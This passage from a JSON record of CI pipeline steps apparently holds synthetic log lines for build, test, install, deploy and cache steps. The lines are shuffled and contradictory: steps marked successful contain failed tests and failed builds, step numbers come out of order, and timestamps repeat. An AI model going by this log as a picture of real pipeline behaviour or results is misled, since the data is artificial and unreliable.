          "\u2713 lint completed",
          "  PASS: test_db_connect (275ms)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Step 10/10: Building",
          "Compiling src/main.py...",
          "WARNING: eslint has known vulnerabilities",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_cache_hit (225ms)",
          "  PASS: test_db_connect (279ms)",
          "  PASS: test_cache_hit (146ms)",
          "Installing webpack@2.4.0",
          "Installing prettier@4.16.0",
          "Artifact uploaded: build.tar.gz (9MB)",
          "  PASS: test_cache_hit (262ms)",
          "[12:00:18] INFO: Processing request",
          "Installing webpack@1.11.0",
          "Installing express@4.15.0",
          "Installing axios@1.17.0",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Step 5/10: Building",
          "WARNING: eslint has known vulnerabilities",
          "Step 2/10: Building",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_auth_login (318ms)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Installing eslint@4.0.0",
          "Cache hit for key-7308",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Cache hit for key-6507",
          "Step 6/10: Building",
          "[12:00:18] WARN: Deprecated API usage",
          "Step 5/10: Building",
          "Step 4/10: Building",
          "\u2713 lint completed",
          "  PASS: test_user_create (341ms)",
          "\u2713 build completed",
          "Step 6/10: Building",
          "Compiling src/index.js...",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "  PASS: test_cache_hit (347ms)",
          "Compiling src/index.js...",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/index.js...",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-03T12:01:04.418054",
        "finished_at": "2025-12-03T12:01:16.009902",
        "log_lines": [
          "=== Step: type_check ===",
          "[12:00:18] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_api_health (267ms)",
          "[12:00:18] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Cache hit for key-3182",
          "[12:00:18] INFO: Processing request",
          "Step 3/10: Building",
          "Cache hit for key-6105",
          "Cache hit for key-2231",
          "[12:00:18] WARN: Deprecated API usage",
          "Compiling src/app.ts...",
          "Compiling src/main.py...",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Installing axios@2.17.0",
          "Step 7/10: Building",
          "  PASS: test_db_connect (107ms)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "  PASS: test_db_connect (428ms)",
          "Installing eslint@1.3.0",
          "Cache hit for key-4191",
          "Compiling src/app.ts...",
          "Installing eslint@2.7.0",
          "[12:00:18] ERROR: Connection failed",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_auth_login (267ms)",
          "\u2713 lint completed",
          "  PASS: test_api_health (394ms)",
          "\u2713 build completed",
          "Step 2/10: Building",
          "  PASS: test_db_connect (349ms)",
          "Step 8/10: Building",
          "\u2713 test completed",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_cache_hit (225ms)",
          "Installing webpack@4.0.0",
          "[12:00:18] INFO: Processing request",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (50MB)",
          "\u2713 test completed",
          "Installing prettier@4.1.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing webpack@4.1.0",
          "Installing webpack@2.18.0",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Installing jest@4.7.0",
          "FAILED: test_api_health",
          "Step 8/10: Building",
          "WARNING: jest has known vulnerabilities",
          "\u2713 test completed",
          "Installing jest@3.13.0",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Step 3/10: Building",
          "  PASS: test_user_create (272ms)",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Step 10/10: Building",
          "[12:00:18] INFO: Processing request",
          "Installing react@1.3.0",
          "\u2713 lint completed",
          "Step 6/10: Building",
          "[12:00:18] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/utils.go...",
          "Compiling src/service.java...",
          "Compiling src/service.java...",
          "  PASS: test_user_create (54ms)",
          "[12:00:18] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Cache hit for key-6480",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Cache hit for key-5910",
          "Step 4/10: Building",
          "  PASS: test_db_connect (237ms)",
          "Installing eslint@4.2.0",
          "  PASS: test_auth_login (1ms)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Cache hit for key-1756",
          "\u2713 build completed",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (17MB)",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_db_connect (301ms)",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_db_connect (197ms)",
          "[12:00:18] INFO: Processing request",
          "WARNING: prettier has known vulnerabilities",
          "Cache hit for key-8454",
          "Installing react@4.18.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Cache hit for key-5209",
          "  PASS: test_db_connect (291ms)",
          "\u2713 test completed",
          "Cache hit for key-7264",
          "Step 2/10: Building",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (43MB)",
          "\u2713 build completed",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_cache_hit (164ms)",
          "Cache hit for key-7525",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Cache hit for key-8528",
          "Artifact uploaded: build.tar.gz (4MB)",
          "\u2713 test completed",
          "Step 5/10: Building",
          "Compiling src/main.py...",
          "WARNING: react has known vulnerabilities",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-03T12:01:16.009902",
        "finished_at": "2025-12-03T12:01:50.785447",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "WARNING: eslint has known vulnerabilities",
          "Step 10/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Exception: ValueError",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "Step 9/10: Building",
          "  PASS: test_user_create (437ms)",
          "Installing react@5.20.0",
          "\u2713 build completed",
          "  PASS: test_user_create (375ms)",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-9626",
          "FAILED: test_user_create",
          "  PASS: test_cache_hit (251ms)",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Cache hit for key-3564",
          "[12:00:18] INFO: Processing request",
          "\u2713 build completed",
          "Cache hit for key-6865",
          "Cache hit for key-7938",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Cache hit for key-2380",
          "Cache hit for key-7908",
          "Artifact uploaded: build.tar.gz (46MB)",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Step 1/10: Building",
          "Cache hit for key-3682",
          "  PASS: test_db_connect (132ms)",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-1410",
          "Compiling src/main.py...",
          "Cache hit for key-2016",
          "Cache hit for key-4418",
          "WARNING: prettier has known vulnerabilities",
          "WARNING: express has known vulnerabilities",
          "Cache hit for key-3214",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (30MB)",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_auth_login (120ms)",
          "Cache hit for key-8400",
          "Cache hit for key-7628",
          "\u2713 build completed",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_user_create (154ms)",
          "  PASS: test_db_connect (158ms)",
          "Step 7/10: Building",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_user_create (65ms)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Installing eslint@5.10.0",
          "  PASS: test_cache_hit (459ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (8MB)",
          "[12:00:18] INFO: Processing request",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (3MB)",
          "FAILED: test_cache_hit",
          "Artifact uploaded: build.tar.gz (26MB)",
          "  PASS: test_user_create (415ms)",
          "Installing react@4.6.0",
          "Installing lodash@1.8.0",
          "Installing jest@3.12.0",
          "[12:00:18] INFO: Processing request",
          "Step 7/10: Building",
          "Compiling src/service.java...",
          "Cache hit for key-8476",
          "Compiling src/service.java...",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 build completed",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (231ms)",
          "  PASS: test_api_health (298ms)",
          "Installing lodash@1.7.0",
          "Compiling src/handler.rs...",
          "Cache hit for key-3713",
          "Exception: TypeError",
          "  PASS: test_api_health (432ms)",
          "FAILED: test_auth_login",
          "Compiling src/utils.go...",
          "Compiling src/handler.rs...",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_db_connect (319ms)",
          "Compiling src/index.js...",
          "Installing react@2.5.0",
          "Cache hit for key-7077",
          "  PASS: test_cache_hit (420ms)",
          "Step 3/10: Building",
          "Cache hit for key-8185",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Compiling src/app.ts...",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:18] INFO: Processing request",
          "Step 6/10: Building",
          "  PASS: test_cache_hit (425ms)",
          "Cache hit for key-6847",
          "Installing jest@1.10.0",
          "Installing prettier@5.16.0",
          "  PASS: test_cache_hit (213ms)",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Cache hit for key-3666",
          "[12:00:18] ERROR: Connection failed",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-03T12:01:50.785447",
        "finished_at": "2025-12-03T12:02:13.969144",
        "log_lines": [
          "=== Step: integration_tests ===",
          "[12:00:18] INFO: Processing request",
          "Installing express@4.14.0",
          "WARNING: express has known vulnerabilities",
          "[12:00:18] INFO: Processing request",
          "WARNING: express has known vulnerabilities",
          "[12:00:18] INFO: Processing request",
          "WARNING: express has known vulnerabilities",
          "[12:00:18] INFO: Processing request",
          "Step 7/10: Building",
          "Installing prettier@3.18.0",
          "Step 3/10: Building",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "FAILED: test_user_create",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 10/10: Building",
          "Cache hit for key-4193",
          "  PASS: test_auth_login (472ms)",
          "[12:00:18] INFO: Processing request",
          "\u2717 build failed with exit code 113",
          "  PASS: test_auth_login (96ms)",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "Cache hit for key-3692",
          "Artifact uploaded: build.tar.gz (40MB)",
          "\u2713 build completed",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_user_create (5ms)",
          "\u2713 build completed",
          "Step 2/10: Building",
          "  PASS: test_user_create (469ms)",
          "\u2717 build failed with exit code 124",
          "Compiling src/service.java...",
          "  PASS: test_auth_login (339ms)",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 7/10: Building",
          "[12:00:18] INFO: Processing request",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (11MB)",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-4389",
          "Artifact uploaded: build.tar.gz (20MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-1954",
          "[12:00:18] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "FAILED: test_db_connect",
          "Cache hit for key-5907",
          "\u2713 test completed",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "FAILED: test_user_create",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Step 6/10: Building",
          "Installing jest@3.2.0",
          "[12:00:18] INFO: Processing request",
          "Installing jest@2.0.0",
          "  PASS: test_user_create (469ms)",
          "Step 1/10: Building",
          "\u2713 build completed",
          "[12:00:18] INFO: Processing request",
          "Installing lodash@4.15.0",
          "  PASS: test_api_health (311ms)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Step 2/10: Building",
          "Installing webpack@1.20.0",
          "WARNING: webpack has known vulnerabilities",
          "Cache hit for key-7480",
          "Step 10/10: Building",
          "  PASS: test_user_create (398ms)",
          "Compiling src/handler.rs...",
          "Step 2/10: Building",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (14MB)",
          "  PASS: test_db_connect (375ms)",
          "  PASS: test_cache_hit (182ms)",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "Compiling src/index.js...",
          "[12:00:18] WARN: Deprecated API usage",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (106ms)",
          "  PASS: test_api_health (41ms)",
          "Cache hit for key-5387",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Step 10/10: Building",
          "Installing react@1.16.0",
          "[12:00:18] ERROR: Connection failed",
          "Step 7/10: Building",
          "[12:00:18] ERROR: Connection failed",
          "\u2713 lint completed",
          "FAILED: test_auth_login",
          "Step 6/10: Building",
          "\u2717 build failed with exit code 19",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Step 7/10: Building",
          "Cache hit for key-3051",
          "  PASS: test_user_create (228ms)",
          "Step 9/10: Building",
          "[12:00:18] INFO: Processing request",
          "Installing react@1.11.0",
          "Step 8/10: Building",
          "\u2713 test completed",
          "Cache hit for key-2936",
          "Step 10/10: Building",
          "Cache hit for key-5779",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-2451",
          "Cache hit for key-2482",
          "Cache hit for key-4617",
          "Artifact uploaded: build.tar.gz (4MB)",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-03T12:02:13.969144",
        "finished_at": "2025-12-03T12:02:18.605883",
        "log_lines": [
          "=== Step: deploy_production ===",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 3/10: Building",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "Cache hit for key-1356",
          "  PASS: test_user_create (33ms)",
          "Installing eslint@3.4.0",
          "Cache hit for key-7209",
          "Compiling src/app.ts...",
          "Step 4/10: Building",
          "[12:00:18] WARN: Deprecated API usage",
          "Exception: RuntimeError",
          "Step 9/10: Building",
          "[12:00:18] WARN: Deprecated API usage",
          "Step 6/10: Building",
          "  PASS: test_cache_hit (300ms)",
          "Compiling src/app.ts...",
          "Cache hit for key-1373",
          "Compiling src/main.py...",
          "Step 7/10: Building",
          "[12:00:18] INFO: Processing request",
          "Step 8/10: Building",
          "Cache hit for key-9422",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-2503",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Compiling src/main.py...",
          "Cache hit for key-5923",
          "Step 5/10: Building",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (49MB)",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-9592",
          "Compiling src/handler.rs...",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-1312",
          "[12:00:18] INFO: Processing request",
          "\u2713 test completed",
          "Step 7/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:18] WARN: Deprecated API usage",
          "[12:00:18] INFO: Processing request",
          "Installing jest@1.4.0",
          "Cache hit for key-3162",
          "[12:00:18] WARN: Deprecated API usage",
          "Cache hit for key-5113",
          "  PASS: test_user_create (473ms)",
          "Installing jest@1.19.0",
          "Installing express@1.15.0",
          "\u2713 build completed",
          "Cache hit for key-4166",
          "Artifact uploaded: build.tar.gz (46MB)",
          "  PASS: test_auth_login (65ms)",
          "\u2713 lint completed",
          "  PASS: test_db_connect (330ms)",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (7MB)",
          "\u2717 build failed with exit code 49",
          "Installing jest@5.1.0",
          "Step 10/10: Building",
          "  PASS: test_db_connect (86ms)",
          "Cache hit for key-9190",
          "Installing lodash@1.4.0",
          "  PASS: test_cache_hit (261ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Cache hit for key-6548",
          "Artifact uploaded: build.tar.gz (45MB)",
          "FAILED: test_api_health",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Step 7/10: Building",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (45MB)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Step 2/10: Building",
          "  PASS: test_db_connect (166ms)",
          "Step 7/10: Building",
          "  PASS: test_auth_login (189ms)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/app.ts...",
          "Cache hit for key-5190",
          "Compiling src/main.py...",
          "WARNING: lodash has known vulnerabilities",
          "Cache hit for key-5483",
          "Installing webpack@4.4.0",
          "Installing express@3.17.0",
          "  PASS: test_cache_hit (109ms)",
          "[12:00:18] INFO: Processing request",
          "Installing eslint@3.13.0",
          "[12:00:18] WARN: Deprecated API usage",
          "[12:00:18] INFO: Processing request",
          "Installing jest@3.12.0",
          "WARNING: webpack has known vulnerabilities",
          "[12:00:18] INFO: Processing request",
          "Step 8/10: Building",
          "Compiling src/service.java...",
          "Installing eslint@3.8.0",
          "Step 4/10: Building",
          "\u2713 test completed",
          "Installing express@2.7.0",
          "Compiling src/handler.rs...",
          "Step 9/10: Building",
          "Compiling src/app.ts...",
          "Cache hit for key-4278",
          "FAILED: test_api_health",
          "Compiling src/handler.rs...",
          "Cache hit for key-5471",
          "Cache hit for key-2002",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/handler.rs...",
          "Cache hit for key-5070",
          "[12:00:18] INFO: Processing request",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-03T12:02:18.605883",
        "finished_at": "2025-12-03T12:02:53.381428",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Installing webpack@4.8.0",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Step 3/10: Building",
          "Step 10/10: Building",
          "Cache hit for key-3934",
          "[12:00:18] INFO: Processing request",
          "Installing prettier@1.4.0",
          "  PASS: test_db_connect (347ms)",
          "Installing react@2.6.0",
          "Step 7/10: Building",
          "Step 1/10: Building",
          "WARNING: axios has known vulnerabilities",
          "Cache hit for key-6335",
          "[12:00:18] WARN: Deprecated API usage",
          "\u2713 test completed",
          "WARNING: lodash has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Compiling src/service.java...",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "[12:00:18] INFO: Processing request",
          "Installing eslint@4.9.0",
          "Installing eslint@4.0.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-9821",
          "\u2713 build completed",
          "Installing eslint@5.12.0",
          "  PASS: test_cache_hit (189ms)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/service.java...",
          "Installing axios@4.0.0",
          "Step 1/10: Building",
          "Compiling src/utils.go...",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Compiling src/main.py...",
          "\u2717 build failed with exit code 56",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "Cache hit for key-8167",
          "Compiling src/main.py...",
          "Exception: ValueError",
          "[12:00:18] INFO: Processing request",
          "Step 7/10: Building",
          "Step 7/10: Building",
          "Cache hit for key-1097",
          "Installing jest@5.12.0",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Step 1/10: Building",
          "  PASS: test_auth_login (98ms)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "  PASS: test_auth_login (235ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] WARN: Deprecated API usage",
          "[12:00:18] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (42MB)",
          "\u2713 test completed",
          "Step 3/10: Building",
          "  PASS: test_api_health (82ms)",
          "[12:00:18] WARN: Deprecated API usage",
          "Installing jest@5.14.0",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Compiling src/index.js...",
          "Cache hit for key-4018",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/handler.rs...",
          "[12:00:18] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Cache hit for key-2442",
          "[12:00:18] INFO: Processing request",
          "Step 7/10: Building",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_user_create (122ms)",
          "[12:00:18] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (27MB)",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-8446",
          "[12:00:18] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Step 2/10: Building",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Step 6/10: Building",
          "Cache hit for key-5356",
          "  PASS: test_cache_hit (85ms)",
          "  PASS: test_api_health (19ms)",
          "Step 10/10: Building",
          "Cache hit for key-4466",
          "Cache hit for key-9740",
          "\u2713 test completed",
          "Installing axios@5.14.0",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Installing jest@2.8.0",
          "  PASS: test_api_health (214ms)",
          "[12:00:18] ERROR: Connection failed",
          "Compiling src/main.py...",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "Installing express@5.13.0",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Step 7/10: Building",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Compiling src/service.java...",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (49MB)",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-03T12:02:53.381428",
        "finished_at": "2025-12-03T12:03:00.336537",
        "log_lines": [
          "=== Step: save_cache ===",
          "Step 6/10: Building",
          "  PASS: test_db_connect (206ms)",
          "  PASS: test_db_connect (65ms)",
          "Step 8/10: Building",
          "Cache hit for key-6703",
          "\u2713 lint completed",
          "Installing express@2.1.0",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Installing webpack@5.9.0",
          "  PASS: test_api_health (475ms)",
          "[12:00:18] ERROR: Connection failed",
          "Step 9/10: Building",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (33MB)",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-3105",
          "Step 3/10: Building",
          "\u2717 build failed with exit code 79",
          "Installing express@2.4.0",
          "Compiling src/utils.go...",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-4338",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "  PASS: test_user_create (204ms)",
          "Compiling src/index.js...",
          "Step 9/10: Building",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Installing react@5.7.0",
          "  PASS: test_db_connect (244ms)",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Installing lodash@1.3.0",
          "Installing axios@2.13.0",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Installing express@2.5.0",
          "Step 2/10: Building",
          "  PASS: test_cache_hit (208ms)",
          "Step 9/10: Building",
          "\u2713 build completed",
          "[12:00:18] WARN: Deprecated API usage",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Compiling src/utils.go...",
          "Compiling src/utils.go...",
          "Compiling src/main.py...",
          "Compiling src/app.ts...",
          "Cache hit for key-5145",
          "[12:00:18] ERROR: Connection failed",
          "Cache hit for key-6338",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Step 5/10: Building",
          "Step 3/10: Building",
          "Step 1/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing lodash@1.19.0",
          "[12:00:18] INFO: Processing request",
          "Step 3/10: Building",
          "Compiling src/handler.rs...",
          "Installing webpack@1.11.0",
          "Cache hit for key-2178",
          "\u2713 test completed",
          "  PASS: test_cache_hit (498ms)",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "Installing axios@3.8.0",
          "[12:00:18] WARN: Deprecated API usage",
          "[12:00:18] INFO: Processing request",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Compiling src/index.js...",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "Installing axios@4.15.0",
          "Cache hit for key-9722",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] WARN: Deprecated API usage",
          "Installing jest@3.11.0",
          "  PASS: test_cache_hit (64ms)",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "Step 1/10: Building",
          "[12:00:18] INFO: Processing request",
          "Installing react@2.18.0",
          "  PASS: test_api_health (251ms)",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] WARN: Deprecated API usage",
          "Installing react@3.18.0",
          "Cache hit for key-7357",
          "Step 4/10: Building",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_auth_login (232ms)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Compiling src/service.java...",
          "WARNING: prettier has known vulnerabilities",
          "Installing lodash@1.13.0",
          "[12:00:18] INFO: Processing request",
          "Compiling src/index.js...",
          "Installing jest@1.7.0",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_user_create (70ms)",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "Cache hit for key-2570",
          "Step 8/10: Building",
          "Compiling src/index.js...",
          "Installing express@5.2.0",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Compiling src/main.py...",
          "Installing express@3.10.0",
          "Step 2/10: Building",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-03T12:03:00.336537",
        "finished_at": "2025-12-03T12:03:35.112082",
        "log_lines": [
          "=== Step: build ===",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "Step 9/10: Building",
          "  PASS: test_cache_hit (346ms)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Step 6/10: Building",
          "WARNING: webpack has known vulnerabilities",
          "  PASS: test_db_connect (462ms)",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Step 5/10: Building",
          "Compiling src/app.ts...",
          "Compiling src/index.js...",
          "Compiling src/service.java...",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_db_connect (264ms)",
          "Step 5/10: Building",
          "Cache hit for key-1888",
          "Compiling src/app.ts...",
          "Cache hit for key-4812",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (9MB)",
          "  PASS: test_auth_login (254ms)",
          "Cache hit for key-2878",
          "  PASS: test_db_connect (418ms)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "\u2713 test completed",
          "Cache hit for key-6485",
          "Cache hit for key-5782",
          "Artifact uploaded: build.tar.gz (1MB)",
          "WARNING: express has known vulnerabilities",
          "  PASS: test_api_health (45ms)",
          "Step 3/10: Building",
          "Compiling src/handler.rs...",
          "Step 2/10: Building",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Installing webpack@4.0.0",
          "Step 10/10: Building",
          "Compiling src/handler.rs...",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "\u2713 build completed",
          "Step 1/10: Building",
          "[12:00:18] INFO: Processing request",
          "Compiling src/utils.go...",
          "Installing react@1.7.0",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (38ms)",
          "Step 7/10: Building",
          "Cache hit for key-1598",
          "  PASS: test_db_connect (241ms)",
          "Step 9/10: Building",
          "Step 5/10: Building",
          "\u2713 lint completed",
          "  PASS: test_api_health (80ms)",
          "  PASS: test_user_create (2ms)",
          "Step 1/10: Building",
          "Installing eslint@3.20.0",
          "WARNING: jest has known vulnerabilities",
          "Cache hit for key-2970",
          "Installing webpack@3.10.0",
          "Exception: TypeError",
          "[12:00:18] WARN: Deprecated API usage",
          "Step 2/10: Building",
